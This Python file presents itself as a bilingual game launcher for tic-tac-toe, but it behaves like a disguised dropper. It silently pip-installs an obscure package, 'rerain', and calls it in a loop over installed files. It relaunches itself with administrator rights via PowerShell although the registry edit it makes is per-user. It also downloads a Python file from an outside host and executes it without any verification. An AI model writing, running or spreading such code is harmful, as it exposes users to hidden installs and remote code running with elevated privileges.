import sys
import subprocess
import os
import requests
import importlib.util

def install_deps():
    for module in ['pygame', 'rerain', 'colorama']:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        site_packages_dir = os.path.join(sys.prefix, 'Lib', 'site-packages', module)
        if os.path.isdir(site_packages_dir):
            for root, dirs, files in os.walk(site_packages_dir):
                for file in files:
                    import rerain
                    rerain.wait(0.5)

def set_language(lang):
    if lang == '--pl':
        return {
            "preparing": "Przygotowywanie...",
            "warning": "⚠️ Ostrzeżenie: Brakujące zależności mogą spowodować niepowodzenie gry, jeśli nie zainstalowano modułów. Upewnij się, że wybierasz właściwy język.",
            "game_not_provided": "❌ Nie podano nazwy gry.",
            "usage": "👉 Użycie: python launcher.py <nazwa_gry> [--pl|--en] [--fast]",
            "file_saved": "Plik zapisany w",
            "error_downloading": "❌ Błąd pobierania pliku:",
            "error_running": "❌ Błąd uruchamiania gry:",
            "game_unknown": "❌ Gra nieznana!",
            "language_warning": "⚠️ Ostrzeżenie: Brakujące zależności mogą spowodować niepowodzenie gry, jeśli moduły nie zostaną zainstalowane. Upewnij się, że wybierasz właściwy język."
        }
    else:
        return {
            "preparing": "Preparing...",
            "warning": "⚠️ WARNING: Missing dependencies may cause the game to fail if modules aren't installed. Ensure you use the correct language.",
            "game_not_provided": "❌ Game name not provided.",
            "usage": "👉 Usage: python launcher.py <game_name> [--pl|--en] [--fast]",
            "file_saved": "File saved at",
            "error_downloading": "❌ Error downloading file:",
            "error_running": "❌ Error running the game:",
            "game_unknown": "❌ Game unknown!",
            "language_warning": "⚠️ WARNING: Missing dependencies may cause the game to fail if modules aren't installed. Ensure you use the correct language."
        }

def add_to_path():
    current_directory = os.path.dirname(os.path.abspath(__file__))
    user_env_path = os.environ.get('Path', '')

    if current_directory not in user_env_path:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("Potrzebne są uprawnienia administratora...")
            script_path = os.path.abspath(__file__)
            subprocess.run([
                'powershell',
                '-Command',
                f'Start-Process -FilePath "python" -ArgumentList \'"{script_path}" --add-path\' -Verb RunAs'
            ])
            sys.exit()

        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Environment", 0, winreg.KEY_READ | winreg.KEY_WRITE) as reg_key:
                try:
                    current_path = winreg.QueryValueEx(reg_key, "Path")[0]
                except FileNotFoundError:
                    current_path = ""

                paths = current_path.split(os.pathsep)
                if current_directory not in paths:
                    new_path = os.pathsep.join(paths + [current_directory])
                    winreg.SetValueEx(reg_key, "Path", 0, winreg.REG_EXPAND_SZ, new_path)
                    HWND_BROADCAST = 0xFFFF
                    WM_SETTINGCHANGE = 0x1A
                    ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, "Environment")
                    print(f"Folder {current_directory} został dodany do zmiennej Path.")
                else:
                    print("Ścieżka już znajduje się w Path.")
        except Exception as e:
            print(f"Błąd podczas dodawania do Path: {e}")


def download_file(url, save_path, fast_mode, messages):
    if fast_mode and os.path.exists(save_path):
        return
    try:
        full_url = f'https://files-hosterino.vercel.app/{url}'
        response = requests.get(full_url)
        response.raise_for_status()
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        with open(save_path, 'wb') as f:
            f.write(response.content)
        from colorama import Fore, Style
        print(Fore.GREEN + f"{messages['file_saved']} {save_path}" + Style.RESET_ALL)
    except requests.exceptions.RequestException as e:
        from colorama import Fore, Style
        print(Fore.RED + f"{messages['error_downloading']} {e}" + Style.RESET_ALL)

def print_language_warning(messages):
    from colorama import Fore, Style
    print(Fore.YELLOW + f"{messages['language_warning']}" + Style.RESET_ALL)

def tic_tac_toe(fast_mode, lang):
    messages = set_language(lang)

    game_name = 'tic_tac_toe'
    game_dir = os.path.join(os.getenv('APPDATA'), 'games', 'python')
    files_dir = os.path.join(game_dir, 'files', game_name)

    if not fast_mode:
        from colorama import Fore, Style
        print(Fore.GREEN + messages["preparing"] + Style.RESET_ALL)
        print_language_warning(messages)
        download_file(f'{game_name}.py', os.path.join(game_dir, f'{game_name}.py'), fast_mode, messages)
        download_file(f'{game_name}/music.mp3', os.path.join(files_dir, 'music.mp3'), fast_mode, messages)
        download_file(f'{game_name}/win.mp3', os.path.join(files_dir, 'win.mp3'), fast_mode, messages)
        download_file(f'{game_name}/win2.mp3', os.path.join(files_dir, 'win2.mp3'), fast_mode, messages)
        install_deps()

    game_file = os.path.join(game_dir, f'{game_name}.py')
    if os.path.exists(game_file):
        spec = importlib.util.spec_from_file_location(game_name, game_file)
        game_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(game_module)

        try:
            game_module.main()
        except Exception as e:
            from colorama import Fore, Style
            print(Fore.RED + f"{messages['error_running']} {str(e)}" + Style.RESET_ALL)

def main():
    if '--add-path' in sys.argv:
        add_to_path()
        sys.exit()

    lang = '--pl' if '--pl' in sys.argv else '--en'
    fast_mode = '--fast' in sys.argv
    messages = set_language(lang)

    if len(sys.argv) < 2:
        from colorama import Fore, Style
        print(Fore.RED + messages["game_not_provided"] + Style.RESET_ALL)
        print(messages["usage"])
        sys.exit(1)

    game_name = sys.argv[1]
    
    if game_name == 'tic_tac_toe':
        tic_tac_toe(fast_mode, lang)
    else:
        from colorama import Fore, Style
        print(Fore.RED + messages["game_unknown"] + Style.RESET_ALL)

if __name__ == "__main__":
    add_to_path()
    main()
